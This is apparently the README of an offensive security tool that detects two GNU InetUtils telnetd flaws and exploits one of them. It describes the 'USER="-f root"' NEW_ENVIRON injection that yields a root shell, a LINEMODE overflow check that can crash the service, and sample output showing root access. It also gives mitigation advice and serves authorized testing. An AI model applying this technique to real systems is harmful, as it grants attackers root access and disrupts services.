# Telnet Vulnerability Scanner (CVE-2026-24061 & CVE-2026-32746)

[![License:ek0ms](https://img.shields.io/badge/ek0ms-savi0r-yellow.svg)](https://github.com/ekomsSavior)

A Python-based security assessment tool that detects and (where applicable) exploits two critical vulnerabilities in GNU InetUtils telnetd:

- **CVE-2026-24061** – Authentication bypass via `USER` environment variable injection (CVSS 9.8)
- **CVE-2026-32746** – Pre-authentication buffer overflow in LINEMODE SLC handler (CVSS 9.8)

##  Important Disclaimer

**This tool is for authorized security testing and educational purposes only.**  
Unauthorized use against systems you do not own or have explicit permission to test is illegal. The authors assume no liability for misuse or damage caused by this tool. Use at your own risk.

##  Features

- **Interactive target selection** – Enter IP addresses or domain names at runtime
- **Selective testing** – Test either vulnerability individually or both
- **CVE-2026-24061 exploitation** – If vulnerable, the tool drops you into an interactive root shell
- **CVE-2026-32746 detection** – Identifies vulnerable systems via controlled crash detection
- **Clean terminal handling** – Raw mode shell with proper restoration on exit


##  Installation

```bash
git clone https://github.com/ekomsSavior/telnet_scan.git
cd telnet_scan
chmod +x telnet_scanner.py  
```

## 📖 Usage

### Basic Execution

```bash
python3 telnet_scanner.py
```

The tool presents an interactive menu:

```
=== Telnet Vulnerability Scanner ===
1. Scan a single target
2. Exit
```

### Scanning Workflow

1. Choose option `1`
2. Enter target (IP or domain, e.g., `192.168.1.100` or `example.com`)
3. Specify port (default is `23` if left empty)
4. Select test type:
   - `1` – Both vulnerabilities
   - `2` – Only CVE-2026-24061 (authentication bypass)
   - `3` – Only CVE-2026-32746 (buffer overflow)

### If CVE-2026-24061 Succeeds

The script will:
1. Detect the vulnerability
2. Obtain an interactive root shell
3. Allow command execution on the target
4. Exit with `Ctrl+C` or by closing the connection

##  How It Works

### CVE-2026-24061 – Authentication Bypass
- Negotiates the `NEW_ENVIRON` Telnet option (RFC 1572)
- Sends a subnegotiation setting `USER="-f root"`
- Vulnerable telnetd passes this to `/usr/bin/login`, bypassing authentication
- Grants immediate root shell access

### CVE-2026-32746 – Buffer Overflow Detection
- Negotiates the `LINEMODE` option (RFC 1184)
- Sends 500+ SLC triplets to overflow the fixed-size buffer
- Monitors for connection drops/crashes to confirm vulnerability

##  Sample Output

```
=== Telnet Vulnerability Scanner ===
1. Scan a single target
2. Exit

Choose option: 1
Target (IP or domain): 192.168.1.100
Port (default 23): 

[*] Scanning 192.168.1.100:23...

Which tests to run?
1. Both
2. Only CVE-2026-24061 (auth bypass)
3. Only CVE-2026-32746 (buffer overflow)
Choice [1-3]: 1

[*] Testing CVE-2026-24061 (authentication bypass)...
[!] CVE-2026-24061: VULNERABLE – shell obtained!

[+] Interactive shell obtained! Type 'exit' to quit.

id
uid=0(root) gid=0(root) groups=0(root)
```

##  Mitigation

If you discover vulnerable systems, apply these fixes:

1. **Upgrade GNU InetUtils** to version 2.8 or later
2. **Disable telnetd** and block TCP/23 at network boundaries
3. **Restrict access** to trusted networks only
4. **Monitor logs** for connections with `NEW_ENVIRON USER` values starting with `-f`

##  Known Limitations

- The overflow test (CVE-2026-32746) may crash the target telnetd service
- Arrow keys and terminal resizing are not fully supported in the interactive shell
- Some firewalls or network configurations may interfere with Telnet option negotiation

